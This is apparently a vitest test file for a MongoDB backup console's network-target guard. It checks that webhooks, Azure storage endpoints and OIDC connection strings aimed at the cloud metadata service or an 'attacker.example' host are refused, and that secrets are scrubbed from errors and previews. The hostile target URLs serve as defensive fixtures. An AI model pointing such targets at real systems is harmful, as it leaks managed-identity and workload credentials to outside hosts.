/**
 * The network-target guard through the API (src/server/network-targets.ts): an admin
 * cannot point webhooks or storage endpoints at the cloud's metadata service, hand the
 * console's managed identity to a foreign endpoint, or use connection strings that
 * authenticate with the console's workload identity, unless the console allows it
 * (MONGOSHIELD_ALLOW_UNSAFE_TARGETS). Also: the secrets every error and job log is
 * scrubbed of, and the connection preview without `proxyPassword`.
 */

import { afterEach, describe, expect, it } from "vitest";
import type { ConsoleSettings } from "../../src/server/context.ts";
import {
  mongoUri,
  removeDataDir,
  setupAdmin,
  startConsole,
  type TestClient,
  type TestConsole,
} from "../helpers/console.ts";

const OIDC_ENVIRONMENT =
  "mongodb://attacker.example:27017/?authMechanism=MONGODB-OIDC&authMechanismProperties=ENVIRONMENT:k8s,TOKEN_RESOURCE:x";

const opened: TestConsole[] = [];
async function adminOf(settings: Partial<ConsoleSettings> = {}): Promise<TestClient> {
  const testConsole = await startConsole({ settings });
  opened.push(testConsole);
  return setupAdmin(testConsole);
}

afterEach(async () => {
  for (const testConsole of opened.splice(0)) {
    await testConsole.close().catch(() => undefined);
    await removeDataDir(testConsole.dataDir);
  }
});

describe("connection strings using the console's workload identity", () => {
  it("are refused by the connection routes, the connection check and config import", async () => {
    const admin = await adminOf();
    const created = await admin.request("POST", "/api/connections", {
      name: "steal",
      uri: OIDC_ENVIRONMENT,
      production: false,
    });
    expect(created.status).toBe(400);
    expect(created.body.error.message).toMatch(/workload identity/);
    expect(created.body.error.hint).toMatch(/MONGOSHIELD_ALLOW_UNSAFE_TARGETS/);

    const checked = await admin.request("POST", "/api/connections/check", {
      uri: OIDC_ENVIRONMENT,
    });
    expect(checked.status).toBe(400);

    const imported = await admin.request("POST", "/api/config/import", {
      dryRun: true,
      planName: "steal",
      document: {
        source: { uri: "mongodb://attacker.example:27017/" },
        storage: "memory://steal",
        backup: { include: ["app.*"] },
      },
      secrets: { steal: { uri: OIDC_ENVIRONMENT } },
    });
    expect(imported.status).toBe(400);
    expect(imported.body.error.message).toMatch(/workload identity/);
  });

  it("are accepted when the console allows unsafe targets", async () => {
    const admin = await adminOf({ allowUnsafeTargets: true });
    const created = await admin.request("POST", "/api/connections", {
      name: "workload",
      uri: OIDC_ENVIRONMENT,
      production: false,
    });
    expect(created.status, created.text).toBe(200);
  });
});

describe("webhooks and storage endpoints", () => {
  it("refuse the metadata service and foreign endpoints for Azure's managed identity", async () => {
    const admin = await adminOf();
    const connection = (
      await admin.request("POST", "/api/connections", {
        name: "src",
        uri: mongoUri(),
        production: false,
      })
    ).body;
    const storage = (
      await admin.request("POST", "/api/storage", { name: "mem", url: "memory://targets" })
    ).body;
    const plan = (url: string) =>
      admin.request("POST", "/api/plans", {
        name: `p-${Math.random()}`,
        connectionId: connection.id,
        storageId: storage.id,
        include: ["app.*"],
        exclude: [],
        compression: "gzip",
        encryption: { kind: "none" },
        consistency: "auto",
        verify: "none",
        notify: [{ type: "webhook", url }],
      });
    const metadata = await plan("http://169.254.169.254/latest/meta-data/iam/");
    expect(metadata.status).toBe(400);
    expect(metadata.body.error.message).toMatch(/metadata/);
    expect((await plan("https://hooks.example.com/notify")).status).toBe(200);

    const foreign = await admin.request("POST", "/api/storage", {
      name: "az",
      url: `az://acct/backups?endpoint=${encodeURIComponent("https://attacker.example")}`,
    });
    expect(foreign.status).toBe(400);
    expect(foreign.body.error.message).toMatch(/Azure identity/);

    const sas = await admin.request("POST", "/api/storage", {
      name: "az-sas",
      url: `az://acct/backups?endpoint=${encodeURIComponent("https://acct.blob.core.windows.net/?sv=1&sig=abc")}`,
    });
    expect(sas.status).toBe(400);
    expect(sas.body.error.hint).toMatch(/AZURE_STORAGE_SAS_TOKEN/);
    expect(sas.text).not.toContain("sig=abc");

    const withToken = await admin.request("POST", "/api/storage", {
      name: "az-token",
      url: "az://acct/backups",
      credentials: { AZURE_STORAGE_SAS_TOKEN: "sv=1&sig=abc" },
    });
    expect(withToken.status, withToken.text).toBe(200);
    expect(withToken.text).not.toContain("sig=abc");
  });

  it("do not let unusable Azure credentials skip the managed-identity rule", async () => {
    const admin = await adminOf();
    const foreignUrl = `az://acct/backups?endpoint=${encodeURIComponent("https://attacker.example")}`;

    // Empty values are refused outright: they would only pretend to be credentials.
    for (const credentials of [
      { AZURE_STORAGE_SAS_TOKEN: "" },
      { AZURE_STORAGE_CONNECTION_STRING: "" },
      { AZURE_STORAGE_SAS_TOKEN: "  " },
    ]) {
      const created = await admin.request("POST", "/api/storage", {
        name: "az-empty",
        url: foreignUrl,
        credentials,
      });
      expect(created.status).toBe(400);
      expect(created.body.error.code).toBe("CONSOLE_VALIDATION");
      expect(created.body.error.message).toMatch(/is empty/);
    }

    // A SAS token without a signature would make the library use the console's identity.
    const unsigned = await admin.request("POST", "/api/storage", {
      name: "az-unsigned",
      url: foreignUrl,
      credentials: { AZURE_STORAGE_SAS_TOKEN: "sv=2024-01-01&sp=rwdl" },
    });
    expect(unsigned.status).toBe(400);
    expect(unsigned.body.error.message).toMatch(/Azure identity/);

    // Updating a location: a usable token first, then swapping in an unsigned one is
    // refused, and so is moving the endpoint while keeping (decrypted) stored values.
    const created = await admin.request("POST", "/api/storage", {
      name: "az-ok",
      url: "az://acct/backups",
      credentials: { AZURE_STORAGE_SAS_TOKEN: "sv=1&sp=rwdl" },
    });
    expect(created.status).toBe(400);
    expect(created.body.error.message).toMatch(/cannot be used/);
    const signed = await admin.request("POST", "/api/storage", {
      name: "az-ok",
      url: "az://acct/backups",
      credentials: { AZURE_STORAGE_SAS_TOKEN: "sv=1&sig=abc" },
    });
    expect(signed.status, signed.text).toBe(200);
    const swapped = await admin.request("PUT", `/api/storage/${signed.body.id}`, {
      name: "az-ok",
      url: foreignUrl,
      credentials: { AZURE_STORAGE_SAS_TOKEN: "sv=1" },
    });
    expect(swapped.status).toBe(400);
    expect(swapped.body.error.message).toMatch(/Azure identity/);
    // Keeping the stored (signed) token, the foreign endpoint is the location's own choice.
    const kept = await admin.request("PUT", `/api/storage/${signed.body.id}`, {
      name: "az-ok",
      url: foreignUrl,
    });
    expect(kept.status, kept.text).toBe(200);

    // Config import takes the same path.
    for (const storageCredentials of [
      { AZURE_STORAGE_SAS_TOKEN: "" },
      { AZURE_STORAGE_SAS_TOKEN: "sv=2024-01-01" },
    ]) {
      const imported = await admin.request("POST", "/api/config/import", {
        dryRun: true,
        planName: "steal",
        document: {
          source: { uri: mongoUri() },
          storage: `az://other/backups?endpoint=${encodeURIComponent("https://attacker.example")}`,
          backup: { include: ["app.*"] },
        },
        secrets: { steal: { storageCredentials } },
      });
      expect(imported.status).toBe(400);
      expect(imported.body.error.message).toMatch(/is empty|Azure identity/);
    }
  });
});

describe("scrubbing", () => {
  it("knows storage credentials, webhook URLs and the configured secrets", async () => {
    const testConsole = await startConsole({
      settings: {
        oidc: {
          issuer: "https://login.example.com",
          clientId: "console",
          clientSecret: "oidc-client-secret-0123456789",
          redirectUrl: "http://localhost/api/oidc/callback",
          scopes: ["openid"],
          rolesMap: new Map(),
          defaultRole: "viewer",
          autoProvision: true,
          clockSkewMs: 60_000,
        },
        metricsToken: "metrics-token-0123456789abcdef0123",
      },
    });
    opened.push(testConsole);
    const admin = await setupAdmin(testConsole);
    await admin.request("POST", "/api/storage", {
      name: "sftp",
      url: "sftp://backup@sftp.example.com/srv",
      credentials: { SFTP_PRIVATE_KEY: "-----BEGIN OPENSSH PRIVATE KEY-----\nkey-material\n" },
    });
    const secrets = testConsole.services.knownSecrets();
    expect(secrets).toContain("-----BEGIN OPENSSH PRIVATE KEY-----\nkey-material\n");
    expect(secrets).toContain("oidc-client-secret-0123456789");
    expect(secrets).toContain("metrics-token-0123456789abcdef0123");
  });

  it("shows connection previews without a proxy password", async () => {
    const admin = await adminOf();
    const created = await admin.request("POST", "/api/connections", {
      name: "via proxy",
      uri: "mongodb://db.example.com/?proxyHost=proxy&proxyUsername=u&proxyPassword=Pr0xy-Secret",
      production: false,
    });
    expect(created.status, created.text).toBe(200);
    expect(created.text).not.toContain("Pr0xy-Secret");
    expect((await admin.request("GET", "/api/connections")).text).not.toContain("Pr0xy-Secret");
  });
});
